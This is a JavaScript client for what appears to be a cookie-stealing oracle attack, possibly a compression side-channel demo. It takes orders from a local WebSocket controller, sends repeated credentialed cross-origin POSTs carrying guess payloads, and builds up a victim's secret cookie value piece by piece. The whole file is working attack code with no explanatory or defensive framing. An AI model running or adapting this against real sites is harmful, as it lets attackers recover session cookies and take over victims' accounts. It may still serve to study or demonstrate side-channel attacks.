document.documentElement.setAttribute('data-theme', 'code')

const STREAM_URL = 'ws://localhost:9000/xhr-interface'
let guessed = false
let currentFinalSecret = ''
let url = ''
let secretPrefix = ''

const startAttack = () => {
  document.getElementById('guessSpan').style = 'display: block; color:#fff;font-weight:400; '
  guessed = false
  const spinner = document.getElementById('spinner')
  const final = document.getElementById('final')
  const spanUrl = document.getElementById('span-url')
  const spanSecretPrefix = document.getElementById('secret-prefix')
  let number = 0
  const timer = setInterval(() => {
    number = (number + 1) % 9
    if (guessed) {
      spinner.innerText = ''
      window.clearInterval(timer)
      return
    }
    if (url.length > 0) spanUrl.innerText = url
    spinner.innerText = number.toString()
    spanSecretPrefix.innerText = secretPrefix

  }, 50)

  const ws = new window.WebSocket(STREAM_URL)
  ws.onopen = function () {
    console.log('connected to ws')
    ws.send('start_oracle')
  }

  // Log errors
  ws.onerror = function (error) {
    console.error('WebSocket Error ' + error)
  }
  // Log messages from the server
  ws.onmessage = function (e) {
    const data = JSON.parse(e.data)
    url = data.url.toString()
    if (data.secret === true) {
      document.getElementById('result').innerHTML = data.finalSecret.toString()
      spinner.innerText = ''
      ws.close()
      guessed = true
      final.innerText = 'Try document.cookie="' + secretPrefix + '' + data.finalSecret.toString() + '"'
      return
    }
    secretPrefix = data.secretPrefix.toString()
    currentFinalSecret = data.finalSecret.toString()
    document.getElementById('result').innerHTML = currentFinalSecret
    xhr(url, data.payload)
  }
}

function xhr (url, body) {
  const xhr = new window.XMLHttpRequest()
  xhr.open('POST', url)
  xhr.withCredentials = true
  xhr.setRequestHeader('Content-Type', 'text/plain')
  xhr.send(body.toString())
}
